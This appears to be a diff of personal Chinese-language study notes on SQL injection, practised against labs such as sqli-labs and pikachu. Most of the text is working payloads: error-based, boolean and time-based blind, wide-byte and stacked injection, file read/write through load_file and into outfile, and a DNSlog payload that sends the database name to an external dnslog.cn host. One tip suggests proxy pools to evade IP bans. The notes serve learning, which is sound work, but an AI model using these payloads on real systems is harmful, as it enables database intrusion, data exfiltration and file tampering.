@@ -17,6 +17,7 @@ select group_concat(table_name) (爆出所有元素）
 
 搜索
 select * from table1 where username like '% x %';
+
 插入数据
 insert into table1 (username,password,xx1,xx2) values('zj','123','xx1','xx2');
 
@@ -118,7 +119,7 @@ select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2) g
 第二种注入方法：
 报错注入(概率问题）
 基础版（最基础、最核心）
-id=2' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)a form information_schema.tables group by a)b) --+
+'union select 1,2,3 from (select count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 
 0x3a  等价于  :
 0x7e  等价于 ~
@@ -128,76 +129,8 @@ id=2' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0
 
 ' and updatexml(1,concat(0x7e,(select database()),0x7e)) --+
 
-三----六 （写工具的时候仔细研究？？？）--没有经过实战测试
-第三种注入方法： class-8
-
-以后自己写工具在仔细研究
-盲注入（不知道闭合方式）
-比对正常与非正常情况
-
-采用python编程比较穷举
-sqlmap攻击
-
-推出闭合方式
-
-select database() ;
-展示当前数据库库名
-
-select length(database(),1,1)
-截取数据库库名（haha），从人类的第一个字，截取一个
-
-select ascii(substr(database(),1,1))=104;
-截取数据库名，从人类的第一个字，截取一个并转为acsii码，判断大小
-
-对照acsii表
-
-select ascii(substr(database(),1,1))=104;
-截取数据库库名第一个字，截取1个，转化为ascii码，判断是不是104
-
-实战：
-?id=1' and  (select ascii(substr(database(),1,1))= 115 )--+
-
-?id=1' and  (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))= 115 )--+
-
-第四种注入方法：
-（验证用单引号） 还是需要验证闭合方式  
-布尔时间型盲注
-界面无反应且无法推断闭合方式
-界面上完全没有反应，但是你好像觉得可以注入，不管正确还是错误都是同一个界面
-
-select sleep(5);
-等5s后输出一个0
-
-and if((select database() )="haha",sleep(5),null);
-如果数据库是haha，睡5s，如果不是什么都不做
-
-实战：
-id=2' and sleep(5) --+
-
-id=2' and if((select database())="security",sleep(5),null)--+
-
-id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null)--+
-
-第五种注入方法：
-
-在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池。。。
-DNSlog注入（一般用于盲注，且没有sqlmap的情况下）
-1' and if((select load_file(concat('\\\\',(select database()),'.b48xu1.dnslog.cn\\x2'))),1,0) --+
-
-\\\\pikachu.b48xu1.dnslog.cn\x2
-
-设置my.ini
-[mysqld]
-secure_file_priv=
-否则不支持load_file命令
 
 
-第六种注入方法：  class-7 
-（没有发现报错位，通过直接创造文件并存储）
-into outfile/load_file
-name=-1' union select 1,load_file('C:/a.txt') --+ 读取c盘下的a.txt文件
-name=-1' union select 1,load_file('C:/a.txt')  into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/haha.txt' --+ 读取c盘的a.txt内容到自己目录下的haha.txt
-这个into outfile不具备创建文件的能力!!!!!!
 
 越权改密(注册账号时，没有规范用户名）
 $new_pass1=$_POST['new_pass1'];
@@ -226,7 +159,9 @@ database() 或者使用ASCII16进制编码，来避免“的使用
 
 uname=admi%df' union select 1,2 #&passwd=admin&submit=Submit
 
-堆叠注入
+堆叠注入lab38
+
+其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。
 
 id=1';insert into users(username,password)values('zj123','xxxx') --+
 网站是那种需要注册码的注册
@@ -477,8 +412,81 @@ $con->close();
 
 
 
+三----六 （写工具的时候仔细研究？？？）--没有经过实战测试
+第三种注入方法： class-8
+
+以后自己写工具在仔细研究
+盲注入（不知道闭合方式）
+比对正常与非正常情况
+
+采用python编程比较穷举
+sqlmap攻击
+
+推出闭合方式
+
+select database() ;
+展示当前数据库库名
+
+select length(database(),1,1)
+截取数据库库名（haha），从人类的第一个字，截取一个
+
+select ascii(substr(database(),1,1))=104;
+截取数据库名，从人类的第一个字，截取一个并转为acsii码，判断大小
+
+对照acsii表
+
+select ascii(substr(database(),1,1))=104;
+截取数据库库名第一个字，截取1个，转化为ascii码，判断是不是104
+
+实战：
+?id=1' and  (select ascii(substr(database(),1,1))= 115 )--+
+
+?id=1' and  (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))= 115 )--+
+
+第四种注入方法：
+（验证用单引号） 还是需要验证闭合方式  
+布尔时间型盲注
+界面无反应且无法推断闭合方式
+界面上完全没有反应，但是你好像觉得可以注入，不管正确还是错误都是同一个界面
+
+select sleep(5);
+等5s后输出一个0
+
+and if((select database() )="haha",sleep(5),null);
+如果数据库是haha，睡5s，如果不是什么都不做
+
+实战：
+id=2' and sleep(5) --+
+
+id=2' and if((select database())="security",sleep(5),null)--+
+
+id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null)--+
+
+第五种注入方法：
+
+在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池。。。
+DNSlog注入（一般用于盲注，且没有sqlmap的情况下）
+1' and if((select load_file(concat('\\\\',(select database()),'.b48xu1.dnslog.cn\\x2'))),1,0) --+
+
+\\\\pikachu.b48xu1.dnslog.cn\x2
+
+设置my.ini
+[mysqld]
+secure_file_priv=
+否则不支持load_file命令
 
 
+第六种注入方法：  class-7 
+（没有发现报错位，通过直接创造文件并存储）
+判断配置文件，是否可以进行文件写入
+-1' union select 1,2,@@global.secure_file_priv -- -
+
+
+
+into outfile/load_file
+name=-1' union select 1,load_file('C:/a.txt') --+ 读取c盘下的a.txt文件
+name=-1' union select 1,load_file('C:/a.txt')  into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/haha.txt' --+ 读取c盘的a.txt内容到自己目录下的haha.txt
+这个into outfile不具备创建文件的能力!!!!!!
 
 
 
